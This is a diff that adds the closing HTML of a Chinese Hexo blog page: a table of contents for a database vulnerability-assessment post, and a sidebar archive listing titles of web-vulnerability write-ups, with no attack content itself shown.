+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#漏洞评估"><span class="toc-number">1.</span> <span class="toc-text">漏洞评估</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#数据库评估"><span class="toc-number">1.1.</span> <span class="toc-text">数据库评估</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#mongodb"><span class="toc-number">1.1.1.</span> <span class="toc-text">mongodb</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#mysql"><span class="toc-number">1.1.2.</span> <span class="toc-text">mysql</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#postgresql"><span class="toc-number">1.1.3.</span> <span class="toc-text">postgresql</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#sqlite"><span class="toc-number">1.1.4.</span> <span class="toc-text">sqlite</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#参考链接"><span class="toc-number">2.</span> <span class="toc-text">参考链接</span></a></li></ol>
+    </div>
+    
+    <div class="back-top">&#xe639;</div>
+    <div class="sidebar">
+    <div class="sidebar-header sidebar-header-show-archive">
+        <div class="sidebar-category">
+
+            <span class="sidebar-archive-link"><span class="iconfont-archer">&#xe67d;</span>archive</span>
+            <span class="sidebar-tags-link"><span class="iconfont-archer">&#xe610;</span>tags</span>
+
+        </div>
+    </div>
+    <div class="sidebar-content sidebar-content-show-archive">
+          <div class="sidebar-archive">
+    <!-- 在ejs中将archive按照时间排序 -->
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    <div class="total-archive" >目前才写: 22 篇博文，好好努力吧，骚年。 </div>
+    
+    <div class="post-archive">
+    
+    
+    
+    
+    <div class="archive-year"> 2017 </div>
+    <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">12/15</span><a class="archive-post-title" href= "/2017/12/15/Vilnerability-Assessment-1/" >漏洞评估-2</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">12/15</span><a class="archive-post-title" href= "/2017/12/15/Vilnerability-Assessment/" >漏洞评估-1</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">12/13</span><a class="archive-post-title" href= "/2017/12/13/php-audit-brainmap1/" >php代码审计脑图</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">12/11</span><a class="archive-post-title" href= "/2017/12/11/file-upload/" >WEB文件上传漏洞总结</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">12/10</span><a class="archive-post-title" href= "/2017/12/10/wooyun-1000php-16/" >mvmmall网店商城系统注入漏洞-2011.07</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">12/10</span><a class="archive-post-title" href= "/2017/12/10/wooyun-1000php-15/" >fckeditor2.6.4 任意文件上传漏洞</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">12/10</span><a class="archive-post-title" href= "/2017/12/10/wooyun-1000php-14/" >PHPCMS V9 通行证注册缺陷</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">12/08</span><a class="archive-post-title" href= "/2017/12/08/wooyun-1000php-8/" >phpcms2008本地文件包括及利用（执行任意SQL脚本）</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">12/08</span><a class="archive-post-title" href= "/2017/12/08/wooyun-1000php-13/" >dedecms v5.3-v5.6 Get Shell</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">12/08</span><a class="archive-post-title" href= "/2017/12/08/wooyun-1000php-9/" >PHP168 V6.02整站系统远程执行任意代码漏洞</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">12/08</span><a class="archive-post-title" href= "/2017/12/08/wooyun-1000php-11/" >Ecshop2.7.2持久型XSS（可获得管理员帐号）</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">12/08</span><a class="archive-post-title" href= "/2017/12/08/wooyun-1000php-12/" >游戏风云cms存在SQL注入</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">12/08</span><a class="archive-post-title" href= "/2017/12/08/wooyun-1000php-10/" >HZCMS 合正网站群内容管理系统SQL注射漏洞</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">12/08</span><a class="archive-post-title" href= "/2017/12/08/wooyun-1000php-5/" >PHPCMS通杀XSS-2010.08</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">12/08</span><a class="archive-post-title" href= "/2017/12/08/wooyun-1000php-4/" >Discuz!漫游插件API本地包含漏洞</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">12/08</span><a class="archive-post-title" href= "/2017/12/08/wooyun-1000php-7/" >phpwind远程代码执行漏洞-2010.09</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">12/08</span><a class="archive-post-title" href= "/2017/12/08/wooyun-1000php-6/" >phpcms 2008 sp4 爆路径及任意文件删除漏洞</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">12/07</span><a class="archive-post-title" href= "/2017/12/07/wooyun-1000php-3/" >ecshop SQL注射漏洞-2010.8.21</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">12/07</span><a class="archive-post-title" href= "/2017/12/07/wooyun-1000php-2/" >Discuz！7.2/X1 第三方心情墙插件SQL注入及持久型XSS漏洞</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">12/07</span><a class="archive-post-title" href= "/2017/12/07/wooyun-1000php-1/" >BlueCMS v1.6 sp1 ad_js.php SQL注入漏洞</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/26</span><a class="archive-post-title" href= "/2017/11/26/hxctf2017-writeup/" >hxctf2017-writeup</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/24</span><a class="archive-post-title" href= "/2017/11/24/blog/" >My blog</a>
+        </li>
+    
+    </div>
+  </div>
+        <div class="sidebar-tags">
+    <div class="sidebar-tags-name">
+    
+        <span class="sidebar-tag-name"><a href= "#">小试牛刀</a></span>
+    
+        <span class="sidebar-tag-name"><a href= "#">漏洞评估</a></span>
+    
+        <span class="sidebar-tag-name"><a href= "#">脑图</a></span>
+    
+        <span class="sidebar-tag-name"><a href= "#">web渗透-文件上传</a></span>
+    
+        <span class="sidebar-tag-name"><a href= "#">wooyun-1000php</a></span>
+    
+    </div>
+    <div class="tag-load-fail" style="display: none; color: #ccc; font-size: 0.6rem;">
+    缺失模块。<br/>
+    1、请确保node版本大于6.2<br/>
+    2、在博客根目录（注意不是archer根目录）执行以下命令：<br/>
+    <span style="color: #f75357; font-size: 1rem; line-height: 2rem;">npm i hexo-generator-json-content --save</span><br/>
+    3、在根目录_config.yml里添加配置：
+    <pre style="color: #888; font-size: 0.6rem;">
+jsonContent:
+  meta: false
+  pages: false
+  posts:
+    title: true
+    date: true
+    path: true
+    text: false
+    raw: false
+    content: false
+    slug: false
+    updated: false
+    comments: false
+    link: false
+    permalink: false
+    excerpt: false
+    categories: true
+    tags: true</pre>
+    </div> 
+    <div class="sidebar-tag-list"></div>
+</div>
+    </div>
+</div> 
+    <script>
+    var jsInfo = {
+        root: '/'
+    }
+</script>
+    <!-- 不蒜子  -->
+    
+    <script async src="//dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    
+    <!-- CNZZ统计  -->
+    
+    </div>
+    </body>
+</html>
+
+
